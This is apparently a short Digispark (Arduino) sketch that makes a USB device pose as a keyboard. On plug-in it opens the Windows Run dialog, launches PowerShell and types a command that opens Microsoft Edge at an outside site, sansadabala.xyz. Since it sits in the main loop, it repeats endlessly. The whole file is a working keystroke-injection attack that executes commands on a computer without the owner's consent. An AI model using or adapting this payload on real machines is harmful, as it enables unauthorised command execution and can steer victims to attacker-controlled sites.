#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("start microsoft-edge:http://sansadabala.xyz");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  }
